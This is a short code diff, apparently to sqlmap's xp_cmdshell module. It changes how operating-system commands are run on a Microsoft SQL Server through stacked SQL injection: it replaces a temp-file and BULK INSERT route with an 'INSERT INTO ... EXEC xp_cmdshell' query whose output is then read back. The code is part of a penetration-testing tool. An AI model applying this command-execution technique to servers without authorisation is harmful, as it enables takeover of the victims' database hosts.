@@ -9,6 +9,7 @@ from lib.core.agent import agent
 from lib.core.common import Backend
 from lib.core.common import getSPQLSnippet
 from lib.core.common import hashDBWrite
+from lib.core.common import isListLike
 from lib.core.common import isNoneValue
 from lib.core.common import pushValue
 from lib.core.common import popValue
@@ -154,8 +155,6 @@ class xp_cmdshell:
         return inject.goStacked(cmd, silent)
 
     def xpCmdshellEvalCmd(self, cmd, first=None, last=None):
-        self.getRemoteTempPath()
-
         if conf.direct:
             output = self.xpCmdshellExecCmd(cmd)
 
@@ -170,23 +169,11 @@ class xp_cmdshell:
 
                 output = new_output
         else:
-            tmpFile = "%s/tmpc%s.txt" % (conf.tmpPath, randomStr(lowercase=True))
-            cmd = "%s > \"%s\"" % (cmd, tmpFile)
-
-            self.xpCmdshellExecCmd(cmd)
-
-            inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, tmpFile, randomStr(10), randomStr(10)))
-
-            self.delRemoteFile(tmpFile)
-
-            output = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, firstChar=first, lastChar=last, safeCharEncode=False)
+            inject.goStacked("INSERT INTO %s EXEC %s '%s'" % (self.cmdTblName, self.xpCmdshellStr, cmd))
+            output = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False)
             inject.goStacked("DELETE FROM %s" % self.cmdTblName)
-
-            if output and isinstance(output, (list, tuple)):
-                output = output[0]
-
-                if output and isinstance(output, (list, tuple)):
-                    output = output[0]
+            if output and isListLike(output):
+                output = output[1:]
 
         return output
 
